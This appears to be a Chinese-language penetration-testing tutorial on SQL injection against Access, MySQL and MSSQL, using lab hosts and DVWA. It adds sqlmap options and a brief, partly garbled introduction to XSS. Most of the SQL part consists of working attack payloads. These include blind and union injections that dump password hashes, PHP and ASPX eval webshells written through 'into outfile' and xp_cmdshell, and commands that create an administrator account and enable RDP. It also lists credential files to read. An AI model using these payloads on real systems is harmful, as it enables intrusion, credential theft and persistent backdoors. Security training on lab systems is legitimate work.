驱动程序不支持所需的属性。</p><p>​&#x2F;news_view.asp，行 20 </p><p>可以判断出改数据库类型为Access数据库</p><h5 id="猜解数据库表名"><a href="#猜解数据库表名" class="headerlink" title="猜解数据库表名"></a>猜解数据库表名</h5><p>​可在注入点后提交如下语句进行查询。</p><p>​and exists(select *  from 数据库表名 )</p><p>​或者</p><p>​and (select count(*) from 数据库表名 )&gt;&#x3D;0</p><p>​上面的语句是判断数据库中是否存在指定数据库表名。如果页面返回出错，那么可更换其他常见数据库表名继续进行查询。</p><h5 id="猜解表字段名及长度"><a href="#猜解表字段名及长度" class="headerlink" title="猜解表字段名及长度"></a>猜解表字段名及长度</h5><p>​可在注入点后提交如下语句查询。</p><p>​and exists(select 字段名  from 数据库表名 )</p><p>​或者</p><p>​and (select count(字段名) from 数据库表名 )&gt;&#x3D;0</p><p>​如果存在此字段名，返回页面正常，否则可更换字段名继续进行猜测。</p><p>​猜解字段长度，可提交如下查询语句。</p><p>​当提交&gt;n-1时正常，而提交到&gt;n时返回出错，那么说明字段长度为n。</p><p>​and (select top 1 len(字段名) from 数据库表名 )&gt;1</p><p>​and (select top 1 len(字段名) from 数据库表名 )&gt;2</p><p>​…</p><p>​and (select top 1 len(字段名) from 数据库表名 )&gt;n-1</p><p>​and (select top 1 len(字段名) from 数据库表名 )&gt;n</p><p>​当提交&gt;n-1时正常，而提交到&gt;n时返回出错，那么说明字段长度为n。</p><h5 id="猜解字段值"><a href="#猜解字段值" class="headerlink" title="猜解字段值"></a>猜解字段值</h5><p>​猜字段的ascii值，可在注入点后提交如下查询语句。</p><p>​and (select top 1 asc(mid(字段名,1,1)) from 数据库表名 )&gt;0</p><p>​and (select top 1 asc(mid(字段名,1,1)) from 数据库表名 )&gt;1</p><p>​…</p><p>​and (select top 1 asc(mid(字段名,1,1)) from 数据库表名 )&gt;n-1</p><p>​and (select top 1 asc(mid(字段名,1,1)) from 数据库表名 )&gt;n</p><p>​当提交&gt;n-I时正常，而提交到&gt;n时返回出错，那么说明字段值的ASCII码为n。反查ASCII码对应的字符，就可得到字段值的第一位字符。再继续提交如下查询。</p><p>​and (select top 1 asc(mid(字段名,2,1)) from 数据库表名 )&gt;0</p><p>​用与上面相同的方法，可得到第二位字符。再继续进行查询，直接猜解出字段的所有字符值为止。</p><h4 id="Access注入实战案例"><a href="#Access注入实战案例" class="headerlink" title="Access注入实战案例"></a>Access注入实战案例</h4><p>案例地址：<a href="http://192.168.138.130:81/news_view.asp?id=14">http://192.168.138.130:81/news_view.asp?id=14</a></p><h5 id="猜解数据库表名和字段"><a href="#猜解数据库表名和字段" class="headerlink" title="猜解数据库表名和字段"></a>猜解数据库表名和字段</h5><p>首先来猜解数据库表名，提交如下网址。</p><p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and exists(select * from users)</p><p>返回错误信息，说明users表不存在，继续提交。</p><p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and exists(select * from admin)</p><p>还是返回错误信息，说明admin表不存在，继续提交。</p><p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and exists(select * from administrator)</p><p>注入错误页面响应：</p><p><img src="/img/oldboy/1-18.png"></p><p>注入正确页面响应：</p><p><img src="/img/oldboy/1-19.png"></p><p>继续猜测字段并提交。</p><p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and exists(select username from administrator)</p><p>返回错误信息，说明不存在username字段，继续提交。</p><p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and exists(select user_name from administrator)</p><p>返回正常页面，administrator表中存在字段user_name</p><p><img src="/img/oldboy/1-20.png"></p><h5 id="猜解字段长度"><a href="#猜解字段长度" class="headerlink" title="猜解字段长度"></a>猜解字段长度</h5><p>再继续猜测第一个字段内容长度。</p><p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 len(user_name) from administrator)&gt;1&#x2F;&#x2F;正常</p><p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 len(user_name) from administrator)&gt;2  &#x2F;&#x2F;正常</p><p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 len(user_name) from administrator)&gt;4  &#x2F;&#x2F;正常</p><p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 len(user_name) from administrator)&gt;5  &#x2F;&#x2F;报错</p><p><img src="/img/oldboy/1-21.png"></p><h5 id="猜解字段内容"><a href="#猜解字段内容" class="headerlink" title="猜解字段内容"></a>猜解字段内容</h5><p>现在猜解字段内容并提交。</p><p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 asc(mid(user_name,1,1)) from administrator)&gt;0  &#x2F;&#x2F;返回正常页面</p><p>说明ASCII值大于0 ,字段值应该为字母，如果是小于0那么说明是汉字，下面我们继续猜解。</p><p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 asc(mid(user_name,1,1)) from administrator)&gt;500  &#x2F;&#x2F;返回错误页面</p><p>说明字段对应的ASCll值在0和500之间。继续提交。</p><p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 asc(mid(user_name,1,1)) from administrator)&gt;100  &#x2F;&#x2F;返回错误页面</p><p>说明字段对应的ASCll值在0和100之间。继续提交。</p><p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 asc(mid(user_name,1,1)) from administrator)&gt;90  &#x2F;&#x2F;返回正常页面</p><p>说明字段对应的ASCll值在90和100之间。继续提交。</p><p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 asc(mid(user_name,1,1)) from administrator)&gt;96  &#x2F;&#x2F;返回正常页面</p><p>说明字段对应的ASCll值在96和100之间。继续提交。</p><p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 asc(mid(user_name,1,1)) from administrator)&gt;97  &#x2F;&#x2F;返回错误页面</p><p>说明administrator表中的user_name字段的第一位ASCII值为97。通过反查ASCII值对应的字母，得到字符值为“a”接着第二位查询。</p><p><img src="/img/oldboy/1-22.png"></p><p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 asc(mid(user_name,2,1)) from administrator)&gt;99  &#x2F;&#x2F;返回正常页面(注：查第二个字母的时候记得把user_name后面的1变成2)</p><p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 asc(mid(user_name,2,1)) from administrator)&gt;100  &#x2F;&#x2F;返回错误页面</p><p>用同样的方法，可猜解user_name字段值和password值,最终得到如下结果:</p><p><img src="/img/oldboy/1-23.png"></p><h5 id="获取后台系统"><a href="#获取后台系统" class="headerlink" title="获取后台系统"></a>获取后台系统</h5><p>得到管理员用户名和密码后，登录后台:<a href="http://192.168.1.55:901/admin/index.asp%EF%BC%8C%E8%BE%93%E5%85%A5%E7%8C%9C%E8%A7%A3%E5%87%BA%E6%9D%A5%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81.%E5%B0%B1%E5%8F%AF%E4%BB%A5%E6%88%90%E5%8A%9F%E8%BF%9B%E5%85%A5%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E9%A1%B5%E9%9D%A2%E3%80%82">http://192.168.1.55:901/admin/index.asp，输入猜解出来的用户名和密码.就可以成功进入网站后台页面。</a></p><p>&#x3D;&#x3D;小提示: access数据库都是存放在网站目录下，后缀格式为mdb，asp，asa,可以通过一些暴库手段、目录猜解等直接下载数据库，如果是MSSQL、MYSQL等，一般数据库是存储在数据库安装路径下，后缀格式为myi，myd，frm，mdf 不能通过下载得到库。除非走狗屎运，对方管理员把网站库备份在网站目录下。&#x3D;&#x3D;</p><h3 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h3><p>基础知识一：<br>mysql4：没有information_schema库信息，因此需要获取库名、表名、字段名时，只能靠猜<br>mysql5：拥有information_schema库信息，因此可以轻松获取库名、表名、字段名<br>基础知识二：<br>mysql中root用户是最高权限用户；<br>mysql中保存用户信息的库是mysql库，对应表user表；<br>等到用户密码信息，可以进行反向破解，最终获取用户名和密码，可以远程登录数据库<br>ps：数据库8.0之后，密码的加密方式换了（sha2 早期mysql_native_password），不能用传统破解方式获取明文密码</p><h4 id="Mysql实战案例"><a href="#Mysql实战案例" class="headerlink" title="Mysql实战案例"></a>Mysql实战案例</h4><p>典型页面：<a href="http://192.168.138.130:90/dvwa/vulnerabilities/sqli/">http://192.168.138.130:90/dvwa/vulnerabilities/sqli/</a></p><h5 id="检查注入点"><a href="#检查注入点" class="headerlink" title="检查注入点"></a>检查注入点</h5><p>在搜索框中输入：1’ or 71&#x3D;1</p><p><img src="/img/oldboy/1-25.png"></p><p>存在注入点</p><h5 id="判断查询字段数"><a href="#判断查询字段数" class="headerlink" title="判断查询字段数"></a>判断查询字段数</h5><p><a href="http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1%5C%27+order+by+1%5C%23&Submit=Submit#">http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1\%27+order+by+1\%23&amp;Submit=Submit#</a></p><p>1’ order by 1#</p><p>发现没有报错说明字段数&gt;1</p><p><a href="http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1%5C%27+order+by+2%5C%23&Submit=Submit#">http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1\%27+order+by+2\%23&amp;Submit=Submit#</a></p><p>1’  order by 2#</p><p>发现没有报错说明字段数&gt;2</p><p><a href="http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1%5C%27++order+by+3%5C%23&Submit=Submit#">http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1\%27++order+by+3\%23&amp;Submit=Submit#</a></p><p>1’  order by 3#</p><p>页面报错：Unknown column ‘3’ in ‘order clause’</p><p>证明：查询的字段数为2</p><h5 id="获取网站业务数据库名称"><a href="#获取网站业务数据库名称" class="headerlink" title="获取网站业务数据库名称"></a>获取网站业务数据库名称</h5><p>查看当前的数据库和用户：</p><p><a href="http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1%5C%27+union+select+user%5C(%5C)%5C,database%5C(%5C)%5C%23&Submit=Submit#">http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1\%27+union+select+user\%28\%29\%2Cdatabase\%28\%29\%23&amp;Submit=Submit#</a></p><p>1’ union select user(),database()#</p><p>结果为：</p><p><img src="/img/oldboy/1-26.png"></p><p>获取数据库信息</p><p><a href="http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1%5C%27union+select+1%5C,group_concat%5C(schema_name%5C)+from+information_schema.schemata%5C%23&Submit=Submit#">http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1\%27union+select+1\%2Cgroup_concat\%28schema_name\%29+from+information_schema.schemata\%23&amp;Submit=Submit#</a></p><p>1’union select 1,group_concat(schema_name) from information_schema.schemata#</p><p><img src="/img/oldboy/1-27.png"></p><p>concat()和group_concat()区别：</p><ul><li><code>CONCAT()</code> 用于将多个字符串或列值连接成一个字符串，适用于单行操作。</li><li><code>GROUP_CONCAT()</code> 用于将分组中的多行值连接成一个字符串，适用于多行操作，并且支持去重、排序和自定义分隔符。</li></ul><h5 id="获取dvwa表名"><a href="#获取dvwa表名" class="headerlink" title="获取dvwa表名"></a>获取dvwa表名</h5><p>获取表名：</p><p><a href="http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1%5C%27union+select+1%5C,group_concat%5C(table_name%5C)+from+information_schema.tables+where+table_schema%5C=database%5C(%5C)%5C%23&Submit=Submit#">http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1\%27union+select+1\%2Cgroup_concat\%28table_name\%29+from+information_schema.tables+where+table_schema\%3Ddatabase\%28\%29\%23&amp;Submit=Submit#</a></p><p>1’union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</p><p><img src="/img/oldboy/1-28.png"></p><h5 id="获取表里的字段值"><a href="#获取表里的字段值" class="headerlink" title="获取表里的字段值"></a>获取表里的字段值</h5><p>获取表里的字段值</p><p>1’ union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273 #</p><p>table_name&#x3D;0x7573657273 使用十六进制编码的原因是：table_name&#x3D;users会报错</p><p><img src="/img/oldboy/1-29.png"></p><h5 id="获取字段内容"><a href="#获取字段内容" class="headerlink" title="获取字段内容"></a>获取字段内容</h5><p>获取字段内容</p><p><a href="http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=++++1%5C%27+union+select+1%5C,group_concat%5C(user_id%5C,0x7c%5C,first_name%5C,0x7c%5C,last_name%5C,0x7c%5C,user%5C,0x7c%5C,password%5C,0x7c%5C,avatar%5C,0x7c%5C)+from+users%5C%23&Submit=Submit#">http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=++++1\%27+union+select+1\%2Cgroup_concat\%28user_id\%2C0x7c\%2Cfirst_name\%2C0x7c\%2Clast_name\%2C0x7c\%2Cuser\%2C0x7c\%2Cpassword\%2C0x7c\%2Cavatar\%2C0x7c\%29+from+users\%23&amp;Submit=Submit#</a></p><p>​    1’ union select 1,group_concat(user_id,0x7c,first_name,0x7c,last_name,0x7c,user,0x7c,password,0x7c,avatar,0x7c) from users#</p><p>结果：</p><p>1|admin|admin|admin|5f4dcc3b5aa765d61d8327deb882cf99|&#x2F;hackable&#x2F;users&#x2F;admin.jpg|,</p><p>2|Gordon|Brown|gordonb|e99a18c428cb38d5f260853678922e03|&#x2F;hackable&#x2F;users&#x2F;gordonb.jpg|,</p><p>3|Hack|Me|1337|8d3533d75ae2c3966d7e0d4fcc69216b|&#x2F;hackable&#x2F;users&#x2F;1337.jpg|,</p><p>4|Pablo|Picasso|pablo|0d107d09f5bbe40cade3de5c71e9e9b7|&#x2F;hackable&#x2F;users&#x2F;pablo.jpg|,</p><p>5|Bob|Smith|smithy|5</p><h5 id="进一步渗透"><a href="#进一步渗透" class="headerlink" title="进一步渗透"></a>进一步渗透</h5><p>前提条件：</p><ul><li>需要知道远程Web目录</li><li>需要mysql root权限</li><li>需要远程目录有写权限</li><li>需要数据库开启secure_file_priv 相当于secure_file_priv的值为空，不为空不充许写入webshell （默认不开启，需要修改mysql.ini配置文件）</li></ul><p>获取web路径方法</p><p>%27%20union%20select%201,load_file(0x433A5C5C57494E444F57535C5C73797374656D33325C5C696E65747372765C5C4D657461426173652E786D6C)+–+&amp;Submit&#x3D;Submit  路径记得转化为十六进制</p><p>0x433A5C5C57494E444F57535C5C73797374656D33325C5C696E65747372765C5C4D657461426173652E786D6C</p><p>&#x3D;C:\WINDOWS\system32\inetsrv\MetaBase.xml</p><p>常见Windows下的配置文件</p><ol><li>c:&#x2F;windows&#x2F;php.ini &#x2F;&#x2F;php配置信息</li><li>c:&#x2F;windows&#x2F;my.ini &#x2F;&#x2F;MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</li><li>c:\mysql\data\mysql\user.MYD &#x2F;&#x2F;存储了mysql.user表中的数据库连接密码</li><li>c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置</li><li>d:\APACHE\Apache2\conf\httpd.conf </li><li>c:\windows\repair\sam &#x2F;&#x2F;存储了WINDOWS系统初次安装的密码</li></ol><p>常见Linux下的配置文件</p><ol><li>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;apache2缺省配置文件 </li><li>&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf &#x2F;&#x2F;虚拟网站设置 </li><li>&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHP相关设置 </li><li>&#x2F;etc&#x2F;sysconfig&#x2F;iptables &#x2F;&#x2F;从中得到防火墙规则策略</li><li>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; apache配置文件 </li><li>&#x2F;etc&#x2F;rsyncd.conf &#x2F;&#x2F;同步程序配置文件</li><li>&#x2F;etc&#x2F;my.cnf &#x2F;&#x2F;mysql的配置文件</li><li>&#x2F;etc&#x2F;redhat-release &#x2F;&#x2F;系统版本</li><li>&#x2F;usr&#x2F;local&#x2F;resin-3.0.22&#x2F;conf&#x2F;resin.conf 针对3.0.22的RESIN配置文件查看</li></ol><p>服务器读取文件：</p><p>union select 1,load_file(‘c:\boot.ini’) #</p><p>写webshell获取权限：</p><p>union select “<?php @eval($_POST['123']);?>“,2 into outfile “C:\phpStudy\WWW\123.php”#</p><h3 id="MsSQL"><a href="#MsSQL" class="headerlink" title="MsSQL"></a>MsSQL</h3><p>数据库用户信息：</p><ul><li>_sa<ul><li>数据库服务中权限最高的用户，同时此用户还可以对系统进行管理操作</li></ul></li><li>_dbowner<ul><li>可以编写webshell</li></ul></li><li>_public<ul><li>只能查询数据库中数据库信息、</li></ul></li></ul><p>典型网站：192.168.138.130:85&#x2F;sqlserver&#x2F;1.aspx？xxser&#x3D;</p><h4 id="SA用户攻击方式"><a href="#SA用户攻击方式" class="headerlink" title="_SA用户攻击方式"></a>_SA用户攻击方式</h4><p><strong>1、SQL注入检查服务类型</strong></p><p>​2 and exists(select * from sysobjects)</p><p>​执行成功-确认为MsSQL数据库</p><p><strong>2、SQL注入检查当前用户</strong></p><p>​确认用户名称信息：</p><p>​and system_user&#x3D;0通过IE报错页面获取用户名(推荐低版本IE浏览器)</p><p>​是否具有特权权限</p><p>​and 1&#x3D;(select IS_SRVROLEMEMBER(‘sysadmin’))检查注入位置是否具有sa权限(无报错，有报错选择其他用户)</p><p><strong>3、SQL确认存储过程功能</strong></p><p>​（判断xp_cmdshell）只有激活了存储过程功能，才能使数据库管理员操作系统</p><p>​and 1&#x3D;(select count(*) from master.dbo.sysobjects where name&#x3D;’xp_cmdshell’)执行没报错-功能处于激活状态</p><p>​EXEC sp_configure ‘show advanced options’, 1;  RECONFIGURE;  EXEC sp_configure ‘xp_cmdshell’, 1;  RECONFIGURE;–</p><p>​——-激活存储过程功能</p><p><strong>4、系统操作命令</strong></p><p>​添加用户账号(系统用户创建)：;exec master..xp_cmdshell ‘net user test test &#x2F;add’</p><p>​划分用户到管理组：;exec master..xp_cmdshell ‘net localgroup administrators test &#x2F;add’</p><p>​启动3389远程功能：exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal Server’,’ fDenyTSConnections’,’REG_DWORD’,0;</p><h4 id="dbowner用户攻击方式"><a href="#dbowner用户攻击方式" class="headerlink" title="_dbowner用户攻击方式"></a>_dbowner用户攻击方式</h4><p><strong>1、SQL注入检查当前用户</strong></p><p>​确认用户名称信息：and 1&#x3D;(SELECT IS_MEMBER(‘db_owner’));–判断当前用户是否为db_owner权限</p><p> <strong>2、SQL注入获取网站路径</strong></p><p>​①通过报错信息</p><p>​②通过搜索引擎（百度、谷歌）</p><p>​③通过相关语句</p><p>​;drop table black;create Table black(result varchar(7996) null,id int not null identity(1,1))–</p><p>​;insert into black exec master..xp_cmdshell ‘dir &#x2F;s c:\1.aspx’–</p><p>​and (select result from black where id&#x3D;4)&gt;0 –</p><p>3、SQL注入木马文件</p><p>​%20;exec%20master..xp_cmdshell%20’Echo%20”&lt;%@ Page Language&#x3D;”Jscript”%&gt;&lt;%eval(Request.Item[“123”],”unsafe”);%&gt;&gt;”%20c:\wwwtest\iis-xxser.com–wwwroot\sqlserver\muma.aspx’–</p><p>dir &#x2F;s c:\1.aspx：搜索1.aspx的路径，因为注入的地址就是1.aspx</p><p>使用webshell工具链接即可</p><h4 id="public用户攻击方式"><a href="#public用户攻击方式" class="headerlink" title="_public用户攻击方式"></a>_public用户攻击方式</h4><p>and 1&#x3D;(SELECT IS_MEMBER(‘db_owner’));–  报错，说明是_public，只能进行脱裤操作</p><p><strong>1、确认数据库名称信息</strong></p><p>​业务数据库确认</p><p>​and db_name()&#x3D;0–</p><p>​获取mssql所有数据库名和路径</p><p>​%20and%200&#x3D;(select%20top%202%20cast([name]%20as%20nvarchar(256))%2bchar(94)%2bcast([filename]%20as%20nvarchar(256))%20from%20(select%20top%202%20dbid,name,filename%20from%20[master].[dbo].[sysdatabases]%20order%20by%20[dbid])%20t%20order%20by%20[dbid]%20desc)–</p><p>&#x3D;&#x3D; and 0&#x3D;(select top 2 cast([name] as nvarchar(256))+char(94)+cast([filename] as nvarchar(256)) from (select top 2 dbid,name,filename from [master].[dbo].[sysdatabases] order by [dbid]) t order by [dbid] desc)–</p><p><strong>2、确认数据库表名称信息</strong></p><p>​获取当前数据库所有表名</p><p>​and 0&lt;&gt;(select top 1 name from testdb.dbo.sysobjects where xtype&#x3D;0x7500 and name not in (select top 2 name from testdb.dbo.sysobjects where xtype&#x3D;0x7500))–</p><p><strong>3、确认数据表字段信息</strong></p><p>爆表名及字段名</p><p>​爆出表中第一个字段：having 1&#x3D;1–</p><p>​爆出表中第二个字段：group by admin.id having 1&#x3D;1–</p><p>​爆出表中第三个字段：group by admin.id,admin.name having 1&#x3D;1–</p><p>4、获取数据信息</p><p><code>/**/and/**/(select/**/top/**/1/**/isnull(cast([id]/**/as/**/nvarchar(4000)),char(32))\%2bchar(94)\%2bisnull(cast([name]/**/as/**/nvarchar(4000)),char(32))\%2bchar(94)\%2bisnull(cast([password]/**/as/**/nvarchar(4000)),char(32))/**/from/**/[testdb]..[admin]/**/where/**/1=1/**/and/**/id/**/not/**/in/**/(select/**/top/**/0/**/id/**/from/**/[testdb]..[admin]/**/where/**/1=1/**/group/**/by/**/id))\%3E0/**/and/**/1=1</code></p><h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>1、使用函数过滤，对敏感字符进行过滤</p><p>2、使用预编译和绑定变量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String <span class="keyword">sql</span><span class="operator">=</span>&quot;select id,no from user where id=?&quot;;</span><br><span class="line">    Preparedstatement ps<span class="operator">=</span>conn.preparestatement(<span class="keyword">sql</span>);</span><br><span class="line">    ps.setInt(<span class="number">1</span>,id);</span><br><span class="line">    ps.executeQuery();</span><br></pre></td></tr></table></figure><p>通过prepare预编译函数会预先编译好,也就是SQL引I擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是时么，都不会影响该sql语句的语法结构了。<strong>只会被当做字符串字面值参数</strong></p><p>3、使用WAF防火墙开启防SQL注入</p><p>4、直接下载相关防范注入文件，通过incloud包含放在网站配置文件里面</p><h2 id="SQL注入工具"><a href="#SQL注入工具" class="headerlink" title="SQL注入工具"></a>SQL注入工具</h2><h3 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h3><p>项目地址：<a href="https://github.com/sqlmapproject/sqlmap">sqlmapproject&#x2F;sqlmap: Automatic SQL injection and database takeover tool</a></p><p><strong>SqlMap常用参数</strong></p><p>1、判断测试点</p><p>​-r 指定注入参数（需要将请求头信息存储在指定文件，注意：复制请求同用crtl+a再复制）<br>​python sqlmap.py -r get.txt<br>​<br>​-u get方法注入，使用时需要加入注入的参数信息<br>​python sqlmap.py -u <a href="http://www.example.com/index.php?id=1">http://www.example.com/index.php?id=1</a><br>​<br>​–level&#x3D;LEVEL执行测试的等级（1-5，默认为1）,使用–level参数且数值&gt;&#x3D;2的时候也会检查cookie里面的参数，当&gt;&#x3D;3的时候将检查User-agent和Referer。<br>​python sqlmap.py -u <a href="http://www.example.com/index.php?id=1">http://www.example.com/index.php?id=1</a> –level&#x3D;2<br>​<br>​–risk&#x3D;RISK 执行测试的风险（0-3，默认为1）,默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。<br>​python sqlmap.py -u <a href="http://www.example.com/index.php?id=1">http://www.example.com/index.php?id=1</a> –risk&#x3D;3<br>​<br>​-v ERBOSE信息级别: 0-6 （缺省1），其值具体含义：“0”只显示python错误以及严重的信息；1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。<br>​python sqlmap.py -u <a href="http://www.example.com/index.php?id=1">http://www.example.com/index.php?id=1</a> -v 3<br>​<br>​-p 后面接参数，针对单个参数注入<br>​python sqlmap.py -u <a href="http://www.example.com/index.php?id=1&name=ews">http://www.example.com/index.php?id=1&amp;name=ews</a> -p id<br>​<br>​–threads线程数，默认为10</p><p>​-batch-smart只能判断测试（推荐）<br>​python sqlmap.py -u <a href="http://www.example.com/index.php?id=1">http://www.example.com/index.php?id=1</a> -batch-smart<br>​<br>​–mobile模拟测试手机环境站点 </p><p>​-m 批量注入，在指定文件内输入多个目标<br>​python sqlmap.py -m test.txt -batch-smart</p><p>2、获取数据</p><p>获取相关信息命令：</p><ul><li>​–dbs  &#x2F;&#x2F;默认情况系sqlmap会自动的探测web应用后端的数据库类型：MySQL、Oracle、PostgreSQL、MicrosoftSQL Server、Microsoft Access、SQLite、Firebird、Sybase、SAPMaxDB、DB2 </li><li>​–current-user：大多数数据库中可检测到数据库管理系统当前用户 </li><li>​–current-db：当前连接数据库名 </li><li>​–is-dba：判断当前的用户是否为管理 </li><li>​–users：列出数据库所有所有用户</li></ul><p>获取表名–tables -D 数据库名</p><p>获取字段名    –columns -T user -D abc</p><p>获取数据内容-T user -C username,password,email –dump</p><p>3、特殊命令</p><p>读取文件内容–file-read &#x2F;etc&#x2F;password</p><p>系统交互的shell    –os-shell</p><p>写webshell     –file-write  “c:&#x2F;3.txt” –file-dest “C:&#x2F;phpStudy&#x2F;WWW&#x2F;3.php” -v1     </p><p>sqlmap过waf –tamper “[模块名]”–存储在tamper目录下</p><p> [sqlmap绕过过滤的 tamper 脚本分类汇总.xlsx](sqlmap绕过过滤的 tamper 脚本分类汇总.xlsx) </p><h1 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>XSS全称（Cross Site Scripting）跨站脚本攻击，XSS是指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的。</p><p>漏洞出现原因：</p><p>​程序对用户的输入没有进行严格的限制，导致恶意脚本在服务器前端有效代码解析执行从而产生危害</p><p>同源策略：</p><p>​为了安全考虑，所有浏览器都约定了“同源策略”，同源策略禁止页面加载或执行与自身来源不同的域的任何脚本，既不同域之间不能使用JS进行操作。比如：x.com域名下的js不能操作y.com域名下的对象</p><p>那么为什么要有同源策略？ 比如一个恶意网站的页面通过js嵌入了银行的登录页面（二者不同源），如果没有同源限制，恶意网页上的javascript脚本就可以在用户登录银行的时候获取用户名和密码。</p><p>Tips:下面这些标签跨域加载资源(资源类型是有限止的)是不受同源策略限制的</p><script src="...">  //加载本地js执行<img src="...">  //图片<link href="...">  //css<iframe src="...">  //任意资源同源策略修改D:\phpStudy\WWW\pikachu\pkxss\rkeypress\rkserver.php   同之前的案例到后台设置好Access-Control-Allow-Origin，设置为*，既允许所有人访问。## 攻击类型### 反射型XSS**中危漏洞**交互的数据一般不会被存在在数据库里面,只是简单的把用户输入的数据反射给浏览器，一次性，所见即所得。 ### 存储型XSS**高危漏洞**交互的数据会被存在在数据库里面,永久性存储,具有很强的稳定性。### DOM型XSS**低危漏洞**不与后台服务器产生数据交互,通过前端的dom节点形成的XSS漏洞。什么是DOM:DOM全称是Document Object Model，也就是文档对象模型。我们可以将DOM理解为，一个与系统平台和编程语言无关的接口，程序和脚本可以通过这个接口动态地访问和修改文档内容、结构和样式。当创建好一个页面并加载到浏览器时，DOM就悄然而生，它会把网页文档转换为一个文档对象，主要功能是处理网页内容。故可以使用 Javascript 语言来操作DOM以达到网页的目的。## 攻击发现XSS漏洞注入点：（植入js代码）- HTML context- Attribute Context- URL Context- Style Context- Script Context## 测试方法1、工具扫描：APPscan、AWVS 2、手工测试：Burpsuite、firefox(hackbar)、XSSER XSSF    使用手工检测Web应用程序是否存在XSS漏洞时，最重要的是考虑那里有输入，输入的数据在什么地方输出。在进行手工检测XSS时，人毕竟不像软件那样不知疲惫，所以一定要选择有特殊意义的字符，这样可以快速测试是否存在XSS。（1）在目标站点上找到输入点,比如查询接口,留言板等;（2）输入一组"特殊字符+唯一识别字符",点击提交后,查看返回的源码,是否有做对应的处理;（3）通过搜索定位到唯一字符,结合唯一字符前后语法确认是否可以构造执行js的条件(构造闭合);提交构造的脚本代码,看是否可以成功执行,如果成功执行则说明存在XSS漏洞;## 